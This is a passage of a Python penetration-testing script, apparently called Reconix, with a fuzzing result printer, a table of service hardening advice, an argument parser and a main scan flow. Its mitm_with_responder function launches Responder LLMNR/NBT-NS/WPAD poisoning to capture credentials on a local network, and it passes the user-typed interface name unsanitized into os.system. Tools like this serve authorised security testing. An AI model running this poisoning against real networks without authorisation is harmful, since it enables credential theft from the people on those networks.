                    status_color = GREEN if status == 200 else YELLOW
                    print(f"  {status_color}[{status}]{RESET} {url}")
            else:
                for vhost, size in results:
                    print(f"  {GREEN}[VHost]{RESET} {vhost} {YELLOW}(Size: {size} bytes){RESET}")
        else:
            print_status("No results found", 'warning')

    except ValueError:
        print_status("Invalid input!", 'error')
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}Fuzzing cancelled{RESET}")
    except Exception as e:
        print_status(f"Error: {e}", 'error')

    input(f"\n{YELLOW}Press Enter to continue...{RESET}")

def hardening_recommendations(scan_results):
    print(f"\n{BOLD}{GREEN}╔══════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{GREEN}║           🛡️  HARDENING RECOMMENDATIONS                       ║{RESET}")
    print(f"{BOLD}{GREEN}╚══════════════════════════════════════════════════════════════╝{RESET}\n")

    service_recommendations = {
        'ftp': {
            'critical': ['Replace FTP with SFTP/FTPS for encrypted connections', 'Disable anonymous FTP access', 'Use strong passwords (12+ characters)'],
            'important': ['Limit FTP access to specific IP ranges', 'Enable logging and monitor for suspicious activity', 'Keep FTP software updated']
        },
        'ssh': {
            'critical': ['Disable root login (PermitRootLogin no)', 'Use SSH key authentication instead of passwords', 'Change default SSH port from 22'],
            'important': ['Implement fail2ban for brute force protection', 'Disable password authentication (PasswordAuthentication no)', 'Use SSH protocol version 2 only', 'Set MaxAuthTries to 3 or less']
        },
        'telnet': {
            'critical': ['🚨 DISABLE TELNET IMMEDIATELY - Use SSH instead', 'Telnet sends credentials in plaintext'],
            'important': []
        },
        'http': {
            'critical': ['Enable HTTPS with TLS 1.2+ (disable TLS 1.0/1.1)', 'Obtain and install valid SSL/TLS certificates', 'Redirect all HTTP traffic to HTTPS'],
            'important': ['Implement HSTS (HTTP Strict Transport Security)', 'Enable WAF (Web Application Firewall)', 'Keep web server software updated', 'Remove default pages and admin panels']
        },
        'https': {
            'critical': ['Ensure TLS 1.3 is enabled', 'Verify certificate is valid and not self-signed'],
            'important': ['Implement certificate pinning', 'Use OCSP stapling', 'Configure secure ciphers only']
        },
        'smb': {
            'critical': ['Disable SMBv1 (vulnerable to EternalBlue)', 'Require SMB signing', 'Restrict SMB access to internal network only'],
            'important': ['Use strong authentication (disable NTLM if possible)', 'Enable encryption for SMB 3.0+', 'Limit share permissions (principle of least privilege)', 'Audit share access regularly']
        },
        'microsoft-ds': {
            'critical': ['Disable SMBv1 protocol', 'Restrict access to trusted networks only'],
            'important': ['Enable SMB encryption', 'Use firewall rules to block port 445 externally']
        },
        'netbios-ssn': {
            'critical': ['Disable NetBIOS if not required', 'Block ports 137-139 at firewall'],
            'important': ['Use DNS instead of NetBIOS for name resolution']
        },
        'rdp': {
            'critical': ['Enable Network Level Authentication (NLA)', 'Use strong, unique passwords (15+ characters)', 'Change default RDP port from 3389'],
            'important': ['Implement account lockout policies', 'Use RDP Gateway or VPN for remote access', 'Keep Windows updated with latest patches', 'Disable RDP if not needed']
        },
        'ms-wbt-server': {
            'critical': ['Enable Network Level Authentication', 'Restrict RDP to VPN/trusted IPs only'],
            'important': ['Monitor RDP logs for failed login attempts']
        },
        'domain': {
            'critical': ['Restrict zone transfers to authorized servers only', 'Implement DNSSEC'],
            'important': ['Use split-horizon DNS', 'Monitor for DNS amplification attacks']
        },
        'mysql': {
            'critical': ['Disable remote root access', 'Use strong passwords for all accounts', 'Run MySQL as non-root user'],
            'important': ['Enable SSL/TLS for MySQL connections', 'Bind MySQL to localhost only if possible', 'Remove anonymous accounts', 'Keep MySQL updated']
        },
        'postgresql': {
            'critical': ['Use md5 or scram-sha-256 authentication', 'Restrict access in pg_hba.conf'],
            'important': ['Enable SSL connections', 'Regular security updates']
        }
    }

    all_recommendations = {'critical': set(), 'important': set(), 'services_found': set()}

    print(f"{BOLD}{CYAN}{'='*70}{RESET}")
    print(f"{BOLD}{CYAN}           HOST-SPECIFIC RECOMMENDATIONS{RESET}")
    print(f"{BOLD}{CYAN}{'='*70}{RESET}\n")

    for result in scan_results:
        print(f"{CYAN}[*] {result['ip']}{RESET}\n")
        host_has_recommendations = False
        for port in result['ports']:
            if port['state'] == 'open':
                service = port['service'].lower()
                if service in service_recommendations:
                    host_has_recommendations = True
                    all_recommendations['services_found'].add(service)
                    recs = service_recommendations[service]
                    print(f"  {YELLOW}Port {port['port']}/{service.upper()}:{RESET}")
                    if recs['critical']:
                        print(f"\n    {RED}{BOLD}CRITICAL:{RESET}")
                        for rec in recs['critical']:
                            print(f"      {RED}•{RESET} {rec}")
                            all_recommendations['critical'].add(f"{service}: {rec}")
                    if recs['important']:
                        print(f"\n    {YELLOW}{BOLD}IMPORTANT:{RESET}")
                        for rec in recs['important']:
                            print(f"      {YELLOW}•{RESET} {rec}")
                            all_recommendations['important'].add(f"{service}: {rec}")
                    print()
        if not host_has_recommendations:
            print(f"  {GREEN}No specific service hardening recommendations{RESET}\n")
        print()

    print(f"{BOLD}{CYAN}{'='*70}{RESET}")
    print(f"{BOLD}{CYAN}           GENERAL SECURITY BEST PRACTICES{RESET}")
    print(f"{BOLD}{CYAN}{'='*70}{RESET}\n")
    print(f"{RED}{BOLD}NETWORK SECURITY:{RESET}")
    print(f"  {RED}•{RESET} Implement a properly configured firewall")
    print(f"  {RED}•{RESET} Use network segmentation (VLANs, DMZ)")
    print(f"  {RED}•{RESET} Close all unnecessary ports and services")
    print(f"  {RED}•{RESET} Implement intrusion detection/prevention (IDS/IPS)")
    print(f"\n{YELLOW}{BOLD}SYSTEM HARDENING:{RESET}")
    print(f"  {YELLOW}•{RESET} Keep all systems and software updated")
    print(f"  {YELLOW}•{RESET} Disable unnecessary services and protocols")
    print(f"  {YELLOW}•{RESET} Implement principle of least privilege")
    print(f"\n{BLUE}{BOLD}ACCESS CONTROL:{RESET}")
    print(f"  {BLUE}•{RESET} Enforce strong password policies (12+ characters)")
    print(f"  {BLUE}•{RESET} Implement Multi-Factor Authentication (MFA)")
    print(f"  {BLUE}•{RESET} Regular access reviews and removal of unused accounts")
    print(f"\n{GREEN}{BOLD}MONITORING & LOGGING:{RESET}")
    print(f"  {GREEN}•{RESET} Enable comprehensive logging on all systems")
    print(f"  {GREEN}•{RESET} Centralize logs (SIEM solution)")
    print(f"  {GREEN}•{RESET} Set up alerts for suspicious activities")
    print(f"\n{MAGENTA}{BOLD}DATA PROTECTION:{RESET}")
    print(f"  {MAGENTA}•{RESET} Encrypt sensitive data at rest and in transit")
    print(f"  {MAGENTA}•{RESET} Regular backups (3-2-1 rule)")
    print(f"  {MAGENTA}•{RESET} Test backup restoration procedures")
    print(f"\n{CYAN}{BOLD}INCIDENT RESPONSE:{RESET}")
    print(f"  {CYAN}•{RESET} Develop and maintain an incident response plan")
    print(f"  {CYAN}•{RESET} Regular security awareness training")
    print(f"  {CYAN}•{RESET} Conduct periodic penetration tests")

    if all_recommendations['critical'] or all_recommendations['important']:
        print(f"\n{BOLD}{RED}{'='*70}{RESET}")
        print(f"{BOLD}{RED}           PRIORITY ACTION ITEMS{RESET}")
        print(f"{BOLD}{RED}{'='*70}{RESET}\n")
        if all_recommendations['critical']:
            print(f"{RED}{BOLD}🚨 CRITICAL ACTIONS (DO IMMEDIATELY):{RESET}")
            for idx, rec in enumerate(sorted(all_recommendations['critical']), 1):
                print(f"  {idx}. {rec}")
            print()
        if all_recommendations['important']:
            print(f"{YELLOW}{BOLD}⚠️  IMPORTANT ACTIONS (SCHEDULE SOON):{RESET}")
            for idx, rec in enumerate(sorted(list(all_recommendations['important']))[:10], 1):
                print(f"  {idx}. {rec}")
            if len(all_recommendations['important']) > 10:
                print(f"  ... and {len(all_recommendations['important']) - 10} more")

    input(f"\n{YELLOW}Press Enter to continue...{RESET}")

def mitm_with_responder():
    print(f"\n{BOLD}{RED}╔══════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{RED}║           🔴 MAN-IN-THE-MIDDLE (RESPONDER)                   ║{RESET}")
    print(f"{BOLD}{RED}╚══════════════════════════════════════════════════════════════╝{RESET}\n")
    if not check_tool('responder'):
        print_status("Responder not found! Install: sudo apt install responder", 'error')
        input(f"\n{YELLOW}Press Enter to continue...{RESET}")
        return
    print(f"{YELLOW}Network Interfaces:{RESET}")
    os.system("ip -br a | grep UP")
    interface = input(f"\n{CYAN}Enter interface (e.g., eth0, wlan0): {RESET}")
    print(f"\n{YELLOW}Responder Modes:{RESET}")
    print(f"{GREEN}[1]{RESET} Standard Poisoning (HTTP, SMB, SQL, FTP)")
    print(f"{GREEN}[2]{RESET} Analyze Mode (passive, no poisoning)")
    print(f"{GREEN}[3]{RESET} WPAD Poisoning (web proxy auto-discovery)")
    print(f"{GREEN}[4]{RESET} Full LLMNR/NBT-NS/MDNS Poisoning")
    try:
        mode = int(input(f"\n{CYAN}Select mode: {RESET}"))
        print(f"\n{RED}[!] Starting Responder...{RESET}")
        print(f"{YELLOW}[!] Press Ctrl+C to stop{RESET}\n")
        time.sleep(2)
        if mode == 1:
            os.system(f"sudo responder -I {interface} -w")
        elif mode == 2:
            os.system(f"sudo responder -I {interface} -A")
        elif mode == 3:
            os.system(f"sudo responder -I {interface} -w -F")
        elif mode == 4:
            os.system(f"sudo responder -I {interface} -w -d -F")
        else:
            print_status("Invalid mode!", 'error')
            return
    except ValueError:
        print_status("Invalid input!", 'error')
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}[!] Responder stopped{RESET}")
    except Exception as e:
        print_status(f"Error: {e}", 'error')
    input(f"\n{YELLOW}Press Enter to continue...{RESET}")

def parse_arguments():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('target', nargs='?', help='Target network')
    parser.add_argument('-h', '--help', action='store_true')
    parser.add_argument('-V', '--version', action='store_true')
    parser.add_argument('-sT', '--tcp', action='store_true')
    parser.add_argument('-sS', '--syn', action='store_true')
    parser.add_argument('-sU', '--udp', action='store_true')
    parser.add_argument('-sA', '--all-ports', action='store_true')
    parser.add_argument('-sF', '--fast', action='store_true')
    parser.add_argument('-PA', '--aggressive-discovery', action='store_true')
    parser.add_argument('-sn', '--ping-only', action='store_true')
    parser.add_argument('-T0', dest='timing', action='store_const', const=0)
    parser.add_argument('-T1', dest='timing', action='store_const', const=1)
    parser.add_argument('-T2', dest='timing', action='store_const', const=2)
    parser.add_argument('-T3', dest='timing', action='store_const', const=3)
    parser.add_argument('-T4', dest='timing', action='store_const', const=4)
    parser.add_argument('-T5', dest='timing', action='store_const', const=5)
    parser.add_argument('-o', '--output', help='Output file')
    parser.add_argument('--no-report', action='store_true')
    parser.add_argument('-v', '--verbose', action='store_true')
    parser.add_argument('-q', '--quiet', action='store_true')
    parser.add_argument('--no-color', action='store_true')
    parser.add_argument('--vuln-scan', action='store_true')
    parser.add_argument('--top-ports', type=int)
    return parser.parse_args()

def main():
    global RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, BOLD, RESET
    args = parse_arguments()
    if args.help or (not args.target and len(sys.argv) == 1):
        print_help()
        sys.exit(0)
    if args.version:
        print(f"{CYAN}{BOLD}Reconix v2.0 Enhanced{RESET}")
        sys.exit(0)
    if args.no_color:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = BOLD = RESET = ''
    if not args.target:
        print_status("No target specified! Use -h for help", 'error')
        sys.exit(1)
    if not args.quiet:
        print_logo()
    network = args.target
    if args.ping_only:
        hosts = discover_hosts(network, args.aggressive_discovery)
        print_status(f"Found {len(hosts)} host(s)", 'success')
        for host in hosts:
            print(f"  {GREEN}→{RESET} {host}")
        sys.exit(0)
    if not args.quiet:
        print(f"\n{BOLD}{WHITE}{'─'*70}{RESET}\n")
        print(f"{BOLD}{MAGENTA}[PHASE 1]{RESET} {BOLD}HOST DISCOVERY{RESET}\n")
    hosts = discover_hosts(network, args.aggressive_discovery)
    if not hosts:
        print_status("No hosts found!", 'error')
        return
    if not args.quiet:
        print(f"\n{BOLD}{WHITE}{'─'*70}{RESET}\n")
        print(f"{BOLD}{MAGENTA}[PHASE 2]{RESET} {BOLD}SERVICE SCANNING{RESET}\n")
    scan_results = []
    for i, host in enumerate(hosts, 1):
        if not args.quiet:
            print(f"\n{CYAN}[Machine {i}/{len(hosts)}]{RESET}")
        result = scan_host(host, args=args)
        scan_results.append(result)
        if not args.quiet:
            print()
    if not args.no_report:
        if not args.quiet:
            print(f"\n{BOLD}{WHITE}{'─'*70}{RESET}\n")
        if args.output:
            save_report(scan_results, args.output)
        else:
            save_report(scan_results)
    if not args.quiet:
        print(f"\n{BOLD}{WHITE}{'─'*70}{RESET}\n")
        print(f"{BOLD}{MAGENTA}[PHASE 3]{RESET} {BOLD}VISUAL REPORT{RESET}\n")
        time.sleep(1)
        print_tree_structure(scan_results)
        print_detailed_report(scan_results)
        print(f"\n{BOLD}{GREEN}{'='*70}{RESET}")
        print(f"{BOLD}{GREEN}                    SCAN COMPLETE!{RESET}")
        print(f"{BOLD}{GREEN}{'='*70}{RESET}\n")
        print_status(f"Total hosts scanned: {len(scan_results)}", 'success')
        total_open_ports = sum(len([p for p in r['ports'] if p['state'] == 'open']) for r in scan_results)
        print_status(f"Total open ports: {total_open_ports}", 'success')
        interactive_menu(scan_results)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{RED}[!] Interrupted. Exiting...{RESET}\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n{RED}[!] Fatal error: {e}{RESET}\n")
        sys.exit(1)
